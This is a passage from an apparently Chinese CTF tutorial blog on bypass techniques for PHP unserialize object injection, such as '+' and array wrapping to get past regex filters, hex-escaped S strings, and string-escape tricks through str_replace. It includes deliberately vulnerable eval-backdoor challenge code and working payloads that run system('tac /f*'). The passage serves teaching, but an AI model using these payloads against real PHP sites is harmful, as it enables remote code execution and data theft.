constant_">__destruct</span><br>D::<span class="hljs-title function_ invoke__">__get</span>(b)<br>D::<span class="hljs-variable constant_">__wakeup</span><br>D::<span class="hljs-variable constant_">__destruct</span><br></code></pre></td></tr></table></figure><p>来自Article_kelp师傅的原理解释，orz：<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-4.jpg"></p><h3 id="使用C代替O"><a href="#使用C代替O" class="headerlink" title="使用C代替O"></a>使用C代替O</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">a - <span class="hljs-keyword">array</span><br>b - <span class="hljs-keyword">boolean</span><br>d - <span class="hljs-keyword">double</span><br>i - <span class="hljs-keyword">integer</span><br>o - common <span class="hljs-keyword">object</span><br>r - reference<br>s - <span class="hljs-keyword">string</span><br>C - custom <span class="hljs-keyword">object</span><br>O - <span class="hljs-class"><span class="hljs-keyword">class</span></span><br><span class="hljs-class"><span class="hljs-title">N</span> - <span class="hljs-title">null</span></span><br><span class="hljs-class"><span class="hljs-title">R</span> - <span class="hljs-title">pointer</span> <span class="hljs-title">reference</span></span><br><span class="hljs-class"><span class="hljs-title">U</span> - <span class="hljs-title">unicode</span> <span class="hljs-title">string</span></span><br></code></pre></td></tr></table></figure><p>例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//https://3v4l.org/YAje0</span><br><span class="hljs-comment">//https://bugs.php.net/bug.php?id=81151</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span>  </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;destruct&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wake up&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;C:1:&quot;E&quot;:0:&#123;&#125;&#x27;</span>));<br></code></pre></td></tr></table></figure><p>比较鸡肋，只能执行<code>construct()</code>和<code>destruct()</code>函数，无法添加任何内容</p><h2 id="绕过正则"><a href="#绕过正则" class="headerlink" title="绕过正则"></a>绕过正则</h2><h3 id="检测’O’"><a href="#检测’O’" class="headerlink" title="检测’O’"></a>检测’O’</h3><blockquote><p>利用条件：<br>preg_match(‘&#x2F;^O:\d+&#x2F;i’,$data)</p></blockquote><p>例题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backdoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;name);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^O:\d+/i&#x27;</span>,<span class="hljs-variable">$data</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;object not allow unserialize&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>利用方式1：当在代码中使用类似<code>preg_match(&#39;/^O:\d+/i&#39;,$data)</code>的正则语句来匹配是否是对象字符串开头的时候，可以使用<code>+</code>绕过</p><p><code>O:8:&quot;backdoor&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;system(&#39;tac /f*&#39;);&quot;;&#125;</code><br><code>O:+8:&quot;backdoor&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;system(&#39;tac /f*&#39;);&quot;;&#125;</code></p><p>要注意在<code>url</code>里传参时<code>+</code>要编码为<code>%2B</code></p><p>利用方式2：使用<code>array()</code>绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backdoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;system(&#x27;tac /f*&#x27;);&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">backdoor</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-comment">//a:1:&#123;i:0;O:8:&quot;backdoor&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;system(&#x27;tac /f*&#x27;);&quot;;&#125;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="检测’-’"><a href="#检测’-’" class="headerlink" title="检测’}’"></a>检测’}’</h3><p>有时候会遇到另一种正则，比如<code>/\&#125;$/</code>，会匹配最后一个<code>&#125;</code></p><p>反序列化字符串末尾的<code>&#125;&#125;&#125;&#125;</code>是可以全部删掉的，没有影响</p><p>比如<code>a:1:&#123;i:0;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;&#125;</code></p><p>变成<code>a:1:&#123;i:0;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;</code></p><p>甚至在末尾填充字符<code>a:1:&#123;i:0;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;aaaaaaaaaa</code></p><p>均能正常解析</p><h3 id="检测数字"><a href="#检测数字" class="headerlink" title="检测数字"></a>检测数字</h3><p>可以用字符<code>i</code>、<code>d</code>绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//https://3v4l.org/SJm2g</span><br><span class="hljs-comment">// echo serialize(0);</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;i:-1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;i:+1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;d:-1.1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;d:+1.2;&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="引用绕过"><a href="#引用绕过" class="headerlink" title="引用绕过"></a>引用绕过</h2><p>利用方式：当代码中存在类似<code>$this-&gt;a===$this-&gt;b</code>的比较时可以用<code>&amp;</code>，使<code>$a</code>永远与<code>$b</code>相等</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;abc&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = &amp;<span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;a===<span class="hljs-variable language_">$this</span>-&gt;b)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-number">666</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>());<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>$this-&gt;b = &amp;$this-&gt;a;</code>表示<code>$b</code>变量指向的地址永远指向<code>$a</code>变量指向的地址</p><h2 id="16进制绕过"><a href="#16进制绕过" class="headerlink" title="16进制绕过"></a>16进制绕过</h2><p>利用方式：当代码中存在关键词检测时，将表示字符类型的<code>s</code>改为大写来绕过检测</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>());<br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:8:&quot;admin888&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如果过滤了关键字<code>admin</code>，可以将其替换成<code>O:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;S:5:&quot;\61dmin&quot;;s:8:&quot;password&quot;;S:8:&quot;\61dmin888&quot;;&#125;</code></p><p>表示字符类型的s为大写时，就会被当成16进制解析</p><h2 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;aaa&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;bbb&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$v</span>);<br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;s:1:&quot;b&quot;;s:3:&quot;bbb&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>由于<code>php</code>在进行反序列化时，是从左到右读取，读取多少取决于<code>s</code>后面的字符长度，且认为读到<code>&#125;</code>就结束了，<code>&#125;</code>后面的字符不会有影响</p><p>一般触发字符逃逸的条件是替换函数<code>str_replace</code>，使字符串长度改变，造成字符逃逸，读取到不一样的数据</p><h3 id="过滤后字符变多"><a href="#过滤后字符变多" class="headerlink" title="过滤后字符变多"></a>过滤后字符变多</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;aaa&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;bbb&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;aaaa&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$v</span>));<br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;aaaa&quot;;s:1:&quot;b&quot;;s:3:&quot;bbb&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以发现结果中的<code>aaa</code>被替换成了<code>aaaa</code>，但是长度值没变，还是<code>3</code>，这就导致多出了一个<code>a</code>，而且值是可控的，我们可以将这部分值变为 <code>很多aaa&quot;;s:1:&quot;b&quot;;s:3:&quot;qaq&quot;;&#125;</code>， <code>很多aaa</code>的具体个数取决于后面想要构造的字符串的长度，这里是<code>21</code>位，就用<code>21</code>组<code>aaa</code>，这样替换后会多出<code>21</code>个字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:1:&quot;b&quot;;s:3:&quot;qaq&quot;;&#125;&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;bbb&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;aaaa&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$v</span>));<br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:84:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:1:&quot;b&quot;;s:3:&quot;qaq&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:3:&quot;bbb&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>$b</code>的值成功被修改成了<code>qaq</code></p><h3 id="过滤后字符变少"><a href="#过滤后字符变少" class="headerlink" title="过滤后字符变少"></a>过滤后字符变少</h3><p>原理与<code>过滤后字符变多</code>大同小异，就是前面少了，导致后面的字符被吃掉，从而执行了我们后面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;&quot;;s:1:&quot;b&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$v</span>));<br><br><span class="hljs-comment">//O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:48:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:1:&quot;b&quot;;s:21:&quot;&quot;;s:1:&quot;b&quot;;s:3:&quot;abc&quot;;&#125;&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>主要注意闭合就行了，与sql注入类似</p><h2 id="类属性不敏感"><a href="#类属性不敏感" class="headerlink" title="类属性不敏感"></a>类属性不敏感</h2><p>对于<code>PHP</code>版本<code>7.1+</code>，对属性的类型不敏感</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$hello</span>=<span class="hljs-string">&quot;private&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$this</span>-&gt;hello);<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:4:&quot;test&quot;:1:&#123;s:5:&quot;hello&quot;;s:6:&quot;public&quot;;&#125;&#x27;</span>);<br><span class="hljs-comment">//string(6) &quot;public&quot;</span><br></code></pre></td></tr></table></figure><p>令<code>public</code>时得到的序列化字符串，在<code>priviate</code>或者<code>protected</code>修饰的时候反序列化，<code>hello</code>属性都能获得值</p><h2 id="类名和方法名不区分大小写"><a href="#类名和方法名不区分大小写" class="headerlink" title="类名和方法名不区分大小写"></a>类名和方法名不区分大小写</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">PHP特性：<br>变量名区分大小写<br>常量名区分大小写<br>数组索引 (键名) 区分大小写<br>函数名, 方法名, 类名不区分大小写<br>魔术常量不区分大小写 (以双下划线开头和结尾的常量)<br>NULL TRUE FALSE 不区分大小写<br>强制类型转换不区分大小写 (在变量前面加上 (type))<br></code></pre></td></tr></table></figure><p>常见用来绕过正则</p><p>如ctfshow的一道题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-12-04 23:52:24</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$cs</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable language_">$this</span>-&gt;password;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$ctfshowo</span>=@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$cs</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ctfshow/&#x27;</span>, <span class="hljs-variable">$cs</span>))&#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Error <span class="hljs-subst">$ctfshowo</span>&quot;</span>,<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="fast-destruct"><a href="#fast-destruct" class="headerlink" title="fast destruct"></a>fast destruct</h2><blockquote><p>通常发序列化的入口在__destruct()方法，如果在反序列化操作之后抛出了异常则会跳过__destruct()函数的执行。</p></blockquote><p>例如这样一道题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$args</span>;<br><br>    <span 